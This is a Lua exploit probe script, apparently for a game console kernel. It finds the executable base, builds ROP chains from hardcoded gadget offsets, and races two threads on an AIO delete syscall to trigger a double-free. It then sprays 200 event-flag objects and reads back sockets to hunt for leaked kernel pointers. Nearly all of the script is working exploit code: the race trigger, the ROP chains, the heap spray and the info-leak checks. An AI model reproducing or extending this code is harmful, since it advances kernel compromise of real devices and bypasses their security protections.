-- CRASH_CLASS: MODERATE
-- PROBE 69b: AIO double-free -> event flag (EVF) spray readback
--
-- Context: 67i2 confirmed TOCTOU double-free in aio_multi_delete (662).
-- After confirmed double-free, spray 200 event flag objects via
-- evf_create(538) and read back via evf_trywait(543). If the freed
-- AIO sub-object was reclaimed by an EVF allocation, its bit-pattern
-- field may contain stale kernel pointers from the AIO infrastructure.
--
-- Also creates TCP sockets BEFORE the spray to test whether earlier
-- socket allocations that overlap with the AIO slot show corruption
-- after the EVF spray clobbers their shared kernel address.

print("=== PROBE 69b: EVF SPRAY READBACK ===")
print("")

-- Standard helpers (ALWAYS include these)
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Additional helpers
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

-- Short aliases
local N = to_num
local mk = make_syscall

-- ============================================================
-- SETUP
-- ============================================================
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid_val
end

-- Eboot base via dynlib_get_info(593)
local ib = memory.alloc(0x200)
safe_wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = safe_rd(N(ib) + 0x108) or 0
local ehi = safe_rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore signals: SIGSEGV(11), SIGSYS(12), SIGPIPE(13)
local sa_buf = memory.alloc(0x20)
safe_wq(N(sa_buf), uint64(1))
safe_wd(N(sa_buf) + 8, 0)
safe_wq(uint64(N(sa_buf) + 16), uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- Open /dev/zero for AIO
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then
    print("FATAL: cannot open /dev/zero")
    print("=== 69b DONE ===")
    return
end

-- ============================================================
-- AIO HELPERS
-- ============================================================
local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    safe_wq(N(reqs), uint64(0))
    safe_wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    safe_wd(N(reqs) + 0x10, bl)
    safe_wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    safe_wd(N(reqs) + 0x18, rl)
    safe_wd(N(reqs) + 0x1C, rh)
    safe_wd(N(reqs) + 0x20, fd_zero)
    safe_wd(N(reqs) + 0x24, 0)
    safe_wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return safe_rd(N(one_id)) or 0
end

local function poll_one(id)
    safe_wd(N(one_id), id)
    safe_wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

-- ============================================================
-- PRE-SPRAY: Create TCP sockets BEFORE the race
-- If the double-freed AIO slot shares an address with one of
-- these sockets, the EVF spray that follows may clobber the
-- socket's internal fields.
-- ============================================================
print("")
print("-- PRE-SPRAY: 50 TCP sockets --")
local pre_fds = {}
for i = 1, 50 do
    local ok, rv = pcall(function()
        return mk(97)(uint64(2), uint64(1), uint64(0))
    end)
    local fd = ok and sgn(rv) or -1
    if fd >= 0 then pre_fds[#pre_fds + 1] = fd end
end
print(string.format("  pre-created: %d sockets", #pre_fds))

-- ============================================================
-- GATE SETUP (socketpair for child synchronization)
-- ============================================================
print("")
print("-- GATE SETUP --")
local sp_A = memory.alloc(16)
safe_wd(N(sp_A), 0xFFFFFFFF)
safe_wd(N(sp_A) + 4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_A))) end)
local gra = safe_rd(N(sp_A)) or -1
local gwa = safe_rd(N(sp_A) + 4) or -1

local sp_B = memory.alloc(16)
safe_wd(N(sp_B), 0xFFFFFFFF)
safe_wd(N(sp_B) + 4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_B))) end)
local grb = safe_rd(N(sp_B)) or -1
local gwb = safe_rd(N(sp_B) + 4) or -1
print(string.format("gateA: rd=%d wr=%d  gateB: rd=%d wr=%d", gra, gwa, grb, gwb))
if gra < 0 or gwa < 0 or grb < 0 or gwb < 0 then
    print("GATE FAIL")
    print("=== 69b DONE ===")
    return
end

-- Shared state buffers
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
local tmp_A = memory.alloc(8)
local tmp_B = memory.alloc(8)
local wbyte = memory.alloc(8)
safe_wd(N(wbyte), 0x42)

-- Child stacks (allocated once, rewritten each iteration)
local stk_A = memory.alloc(0x4000)
local stk_B = memory.alloc(0x4000)

-- ============================================================
-- RACE LOOP: 662 double-free via gated thr_new children
-- ============================================================
local ITERS = 10
local total_doubles = 0

print("")
print("-- RACE: " .. ITERS .. " iters --")

for iter = 1, ITERS do
    if not alive() then print("DEAD at iter " .. iter); break end

    -- Submit BATCH AIO requests + poll each
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end
    if #ids < BATCH then print("SHORT at iter " .. iter); break end

    -- Write IDs to shared buffer and init status arrays
    for i = 0, BATCH - 1 do
        safe_wd(N(del_ids) + i * 4, ids[i + 1])
        safe_wd(N(states_A) + i * 4, 0xAA)
        safe_wd(N(states_B) + i * 4, 0xBB)
    end
    safe_wq(N(marker_A), uint64(0))
    safe_wq(N(marker_B), uint64(0))

    -- Build child A ROP chain:
    --   write marker -> read gate (block) -> call 662 -> thr_exit
    local sb_A = N(stk_A)
    for i = 0, 0x1FFC, 4 do safe_wd(sb_A + i, 0) end
    local sp_a = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    local oa = 0
    local function wa(v) safe_wq(sp_a + oa, v); oa = oa + 8 end
    -- Write marker (child A alive and waiting)
    wa(g_pop_rax); wa(uint64(0x41414141))
    wa(g_pop_rdi); wa(uint64(N(marker_A))); wa(g_mov_m_rax)
    -- read(gate_rd_fd, tmp, 1) -- blocks until main fires gate
    wa(g_pop_rax); wa(uint64(3))
    wa(g_pop_rdi); wa(uint64(gra))
    wa(g_pop_rsi); wa(uint64(N(tmp_A)))
    wa(g_pop_rdx); wa(uint64(1)); wa(stub)
    -- 662(del_ids, BATCH, states_A)
    wa(g_pop_rdi); wa(uint64(N(del_ids)))
    wa(g_pop_rsi); wa(uint64(BATCH))
    wa(g_pop_rdx); wa(uint64(N(states_A)))
    wa(g_pop_rax); wa(uint64(662)); wa(stub)
    -- thr_exit(0)
    wa(g_pop_rdi); wa(uint64(0))
    wa(g_pop_rax); wa(uint64(431)); wa(stub)

    -- Build child B ROP chain (same structure, different gate + states)
    local sb_B = N(stk_B)
    for i = 0, 0x1FFC, 4 do safe_wd(sb_B + i, 0) end
    local sp_b = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    local ob = 0
    local function wb(v) safe_wq(sp_b + ob, v); ob = ob + 8 end
    wb(g_pop_rax); wb(uint64(0x42424242))
    wb(g_pop_rdi); wb(uint64(N(marker_B))); wb(g_mov_m_rax)
    wb(g_pop_rax); wb(uint64(3))
    wb(g_pop_rdi); wb(uint64(grb))
    wb(g_pop_rsi); wb(uint64(N(tmp_B)))
    wb(g_pop_rdx); wb(uint64(1)); wb(stub)
    wb(g_pop_rdi); wb(uint64(N(del_ids)))
    wb(g_pop_rsi); wb(uint64(BATCH))
    wb(g_pop_rdx); wb(uint64(N(states_B)))
    wb(g_pop_rax); wb(uint64(662)); wb(stub)
    wb(g_pop_rdi); wb(uint64(0))
    wb(g_pop_rax); wb(uint64(431)); wb(stub)

    -- thr_param for child A
    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do safe_wd(N(pa) + i, 0) end
    safe_wq(N(pa), g_bare_ret)
    safe_wq(N(pa) + 0x10, uint64(sb_A))
    safe_wq(N(pa) + 0x18, uint64(0x2000))

    -- thr_param for child B
    local pb = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do safe_wd(N(pb) + i, 0) end
    safe_wq(N(pb), g_bare_ret)
    safe_wq(N(pb) + 0x10, uint64(sb_B))
    safe_wq(N(pb) + 0x18, uint64(0x2000))

    -- Spawn both children
    pcall(function() mk(455)(pa, uint64(0x38)) end)
    pcall(function() mk(455)(pb, uint64(0x38)) end)

    -- Wait for both markers (children alive and waiting at gate)
    local a_rdy, b_rdy = false, false
    for w = 1, 500000 do
        if not a_rdy and N(safe_rq(N(marker_A)) or uint64(0)) ~= 0 then a_rdy = true end
        if not b_rdy and N(safe_rq(N(marker_B)) or uint64(0)) ~= 0 then b_rdy = true end
        if a_rdy and b_rdy then break end
    end
    if not (a_rdy and b_rdy) then
        print(string.format("  iter %d: MARKER TIMEOUT a=%s b=%s", iter,
            tostring(a_rdy), tostring(b_rdy)))
        break
    end

    -- Brief delay then fire both gates simultaneously
    for d = 1, 500 do end
    pcall(function() mk(4)(uint64(gwa), uint64(N(wbyte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gwb), uint64(N(wbyte)), uint64(1)) end)

    -- Wait for children to complete
    for w = 1, 100000 do end

    -- Count doubles (both children successfully deleted same ID)
    local a_ok, b_ok, doubles = 0, 0, 0
    for i = 0, BATCH - 1 do
        local sA = safe_rd(N(states_A) + i * 4) or 0xAA
        local sB = safe_rd(N(states_B) + i * 4) or 0xBB
        if sA == 0 then a_ok = a_ok + 1 end
        if sB == 0 then b_ok = b_ok + 1 end
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        print(string.format("  iter %d: *** %d DOUBLES *** A=%d B=%d", iter, doubles, a_ok, b_ok))
    else
        print(string.format("  iter %d: A=%d B=%d", iter, a_ok, b_ok))
    end
end

print("")
print("TOTAL_DOUBLES=" .. total_doubles)

if total_doubles == 0 then
    print("NO DOUBLES -- skipping spray")
    -- Close pre-sockets
    for _, fd in ipairs(pre_fds) do
        pcall(function() mk(6)(uint64(fd)) end)
    end
    print("alive=" .. (alive() and "YES" or "NO"))
    print("=== 69b DONE ===")
    return
end

print("*** DOUBLE-FREE CONFIRMED -- proceeding to EVF spray ***")

-- ============================================================
-- [SPRAY] Create 200 event flags via evf_create(538)
-- evf_create(name_ptr, flags=0x100, initial_bits)
-- Each EVF gets unique name "evf000".."evf199" and sentinel bits
-- 0xCAFE0000 + i so we can detect if readback shows different data.
-- ============================================================
print("")
print("-- SPRAY: 200 event flags --")

local EVF_COUNT = 200
local evf_handles = {}
local evf_expected = {}

for i = 1, EVF_COUNT do
    if not alive() then print("DEAD during spray at " .. i); break end
    local name = string.format("evf%03d", i)
    local np = put_str(name)
    local initial_bits = 0xCAFE0000 + i
    local ok, rv = pcall(function()
        return mk(538)(uint64(N(np)), uint64(initial_bits))
    end)
    local h = ok and N(rv) or -1
    if h >= 0 and h < 0x10000000 then
        evf_handles[#evf_handles + 1] = h
        evf_expected[#evf_expected + 1] = initial_bits
    end
end
print(string.format("  created: %d/%d evf objects", #evf_handles, EVF_COUNT))

if #evf_handles > 0 then
    print(string.format("  handle range: 0x%X .. 0x%X",
        evf_handles[1], evf_handles[#evf_handles]))
end

-- ============================================================
-- [READBACK] evf_trywait(543) -- read back bit patterns
-- evf_trywait(handle, wait_pattern, mode, &result)
-- mode 0x10 = check all bits without clearing (non-blocking)
-- Expected: result = initial_bits = 0xCAFE0000 + i
-- Anomaly: different value, especially kernel pointer shape
-- ============================================================
print("")
print("-- READBACK evf_trywait --")

local evf_out = memory.alloc(16)
local kptrs = 0
local anomalies = 0

for i = 1, #evf_handles do
    local h = evf_handles[i]
    local expected = evf_expected[i]

    -- Clear output buffer with sentinels
    safe_wd(N(evf_out), 0xCCCCCCCC)
    safe_wd(N(evf_out) + 4, 0xCCCCCCCC)
    safe_wd(N(evf_out) + 8, 0xCCCCCCCC)
    safe_wd(N(evf_out) + 12, 0xCCCCCCCC)

    -- 543 poll: (handle, bits, mode) — ret=0 if set, ret=-1 if not
    local ok, rv = pcall(function()
        return mk(543)(uint64(h), uint64(0xFFFFFFFF), uint64(1))
    end)
    local ret543 = ok and rv or nil

    -- 542 wait: (handle, bits, mode, result_ptr, timeout=0)
    safe_wq(N(evf_out), uint64(0xCCCCCCCC))
    safe_wq(N(evf_out) + 8, uint64(0xCCCCCCCC))
    pcall(function()
        mk(542)(uint64(h), uint64(0xFFFFFFFF), uint64(1), uint64(N(evf_out)), uint64(0))
    end)

    local d0 = safe_rd(N(evf_out)) or 0xCCCCCCCC
    local d1 = safe_rd(N(evf_out) + 4) or 0xCCCCCCCC

    -- Print first few results for calibration
    if i <= 3 then
        local r543_str = ret543 and fmt(ret543) or "nil"
        print(string.format("  [%d] h=0x%X 543=%s 542_out=0x%08X_%08X (expected 0x%08X)",
            i, h, r543_str, d1, d0, expected))
    end

    -- Check 543 return for anomalies
    if ret543 then
        local rh, rl = get_hi_lo(ret543)
        if rh >= 0xFFFF8000 and rh ~= 0xFFFFFFFF then
            kptrs = kptrs + 1
            print(string.format("  [%d] h=0x%X *** KPTR in 543 ret: %s ***", i, h, fmt(ret543)))
        end
    end

    -- Check 542 result for kernel pointer shape or overlap
    if d0 ~= 0xCCCCCCCC and d0 ~= 0 then
        if d0 ~= expected then
            anomalies = anomalies + 1
            if anomalies <= 20 then
                print(string.format("  [%d] h=0x%X ANOMALY lo=0x%08X (expected 0x%08X) hi=0x%08X",
                    i, h, d0, expected, d1))
            end
            if d0 >= 0xCAFE0001 and d0 <= 0xCAFE0000 + EVF_COUNT then
                local overlap_idx = d0 - 0xCAFE0000
                if anomalies <= 20 then
                    print(string.format("    OVERLAP: contains evf[%d]'s bits -- SAME SLAB SLOT!", overlap_idx))
                end
            end
            if d0 >= 0xFFFF8000 and d0 ~= 0xFFFFFFFF then
                kptrs = kptrs + 1
                print(string.format("    *** KPTR in lo: 0x%08X ***", d0))
            end
        end
    end

    if d1 ~= 0 and d1 ~= 0xCCCCCCCC then
        anomalies = anomalies + 1
        if anomalies <= 20 then
            print(string.format("  [%d] h=0x%X ANOMALY hi=0x%08X (expected 0)", i, h, d1))
        end
        if d1 >= 0xFFFF8000 and d1 ~= 0xFFFFFFFF then
            kptrs = kptrs + 1
            print(string.format("    *** KPTR in hi: 0x%08X ***", d1))
        end
    end

    -- Check past the expected output for kernel data bleed
    local d2 = safe_rd(N(evf_out) + 8) or 0xCCCCCCCC
    local d3 = safe_rd(N(evf_out) + 12) or 0xCCCCCCCC
    if d2 ~= 0xCCCCCCCC or d3 ~= 0xCCCCCCCC then
        anomalies = anomalies + 1
        if anomalies <= 20 then
            print(string.format("  [%d] h=0x%X EXTRA +8=0x%08X +12=0x%08X",
                i, h, d2, d3))
        end
        if d2 >= 0xFFFF8000 and d2 ~= 0xFFFFFFFF then
            kptrs = kptrs + 1
            print("    *** KPTR AT +8! ***")
        end
        if d3 >= 0xFFFF8000 and d3 ~= 0xFFFFFFFF then
            kptrs = kptrs + 1
            print("    *** KPTR AT +12! ***")
        end
    end
end

-- ============================================================
-- [PRE-SOCKET CHECK] Read back pre-created TCP sockets
-- If an EVF's creation overwrote data at the same kernel address
-- as a pre-created socket's PCB, getsockopt will return corrupted
-- values.
-- ============================================================
print("")
print("-- PRE-SOCKET SO_LINGER check --")

local linger_buf = memory.alloc(16)
local lenp = memory.alloc(8)
local sock_anomalies = 0

for i = 1, #pre_fds do
    -- Read SO_LINGER (should be l_onoff=0, l_linger=0 since never set)
    for j = 0, 12, 4 do safe_wd(N(linger_buf) + j, 0xCCCCCCCC) end
    safe_wd(N(lenp), 16)

    local ok, rv = pcall(function()
        return mk(118)(uint64(pre_fds[i]),
            uint64(0xFFFF),    -- SOL_SOCKET
            uint64(0x0080),    -- SO_LINGER
            uint64(N(linger_buf)),
            uint64(N(lenp)))
    end)

    if ok and sgn(rv) == 0 then
        local d0 = safe_rd(N(linger_buf)) or 0xCCCCCCCC       -- l_onoff
        local d1 = safe_rd(N(linger_buf) + 4) or 0xCCCCCCCC   -- l_linger
        local d2 = safe_rd(N(linger_buf) + 8) or 0xCCCCCCCC   -- past struct

        -- Expected: l_onoff=0, l_linger=0 (never set)
        if d0 ~= 0 or d1 ~= 0 then
            sock_anomalies = sock_anomalies + 1
            if sock_anomalies <= 10 then
                print(string.format("  [%d] fd=%d l_onoff=0x%08X l_linger=0x%08X ANOMALY",
                    i, pre_fds[i], d0, d1))
            end
            if d0 >= 0xFFFF8000 and d0 ~= 0xFFFFFFFF then
                kptrs = kptrs + 1
                print("    *** KPTR in l_onoff! ***")
            end
            if d1 >= 0xFFFF8000 and d1 ~= 0xFFFFFFFF then
                kptrs = kptrs + 1
                print("    *** KPTR in l_linger! ***")
            end
        end

        -- Overcopy check
        if d2 ~= 0xCCCCCCCC then
            sock_anomalies = sock_anomalies + 1
            if sock_anomalies <= 10 then
                print(string.format("  [%d] fd=%d OVERCOPY +8=0x%08X", i, pre_fds[i], d2))
            end
        end
    elseif ok and sgn(rv) ~= 0 then
        -- getsockopt failed -- socket might be corrupted
        sock_anomalies = sock_anomalies + 1
        if sock_anomalies <= 10 then
            print(string.format("  [%d] fd=%d getsockopt FAILED ret=%d",
                i, pre_fds[i], sgn(rv)))
        end
    end
end
if sock_anomalies == 0 then print("  (all normal)") end

-- Also check SO_TYPE on pre-sockets (expected: SOCK_STREAM=1)
print("")
print("-- PRE-SOCKET SO_TYPE check --")
local type_anomalies = 0
for i = 1, #pre_fds do
    safe_wd(N(linger_buf), 0xCCCCCCCC)
    safe_wd(N(lenp), 4)
    local ok, rv = pcall(function()
        return mk(118)(uint64(pre_fds[i]),
            uint64(0xFFFF),    -- SOL_SOCKET
            uint64(0x1008),    -- SO_TYPE
            uint64(N(linger_buf)),
            uint64(N(lenp)))
    end)
    if ok and sgn(rv) == 0 then
        local stype = safe_rd(N(linger_buf)) or 0xCCCCCCCC
        if stype ~= 1 then  -- SOCK_STREAM = 1
            type_anomalies = type_anomalies + 1
            if type_anomalies <= 10 then
                print(string.format("  [%d] fd=%d SO_TYPE=0x%08X (expected 1) ANOMALY",
                    i, pre_fds[i], stype))
            end
        end
    end
end
if type_anomalies == 0 then print("  (all SOCK_STREAM=1)") end

-- ============================================================
-- CLEANUP
-- ============================================================
print("")
print("-- CLEANUP --")

-- Delete EVFs via evf_delete(539)
local evf_del_fail = 0
for i = 1, #evf_handles do
    local ok, rv = pcall(function()
        return mk(539)(uint64(evf_handles[i]))
    end)
    if not ok or N(rv) ~= 0 then evf_del_fail = evf_del_fail + 1 end
end
if evf_del_fail > 0 then
    print(string.format("  evf_delete failures: %d/%d", evf_del_fail, #evf_handles))
end

-- Close pre-sockets
for _, fd in ipairs(pre_fds) do
    pcall(function() mk(6)(uint64(fd)) end)
end

-- Close gates + fd_zero
pcall(function() mk(6)(uint64(gra)) end)
pcall(function() mk(6)(uint64(gwa)) end)
pcall(function() mk(6)(uint64(grb)) end)
pcall(function() mk(6)(uint64(gwb)) end)
pcall(function() mk(6)(uint64(fd_zero)) end)

-- ============================================================
-- RESULTS
-- ============================================================
print("")
print(string.format("RESULTS: doubles=%d kptrs=%d evf_anomalies=%d sock_anomalies=%d type_anomalies=%d",
    total_doubles, kptrs, anomalies, sock_anomalies, type_anomalies))
if kptrs > 0 then
    print("*** KERNEL POINTER DETECTED -- AIO slot reclaimed! ***")
else
    print("No kernel pointers found in EVF/socket readback")
end
if evf_del_fail > 0 then
    print(string.format("EVF delete failures (possible double-free cascade): %d", evf_del_fail))
end
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 69b DONE ===")
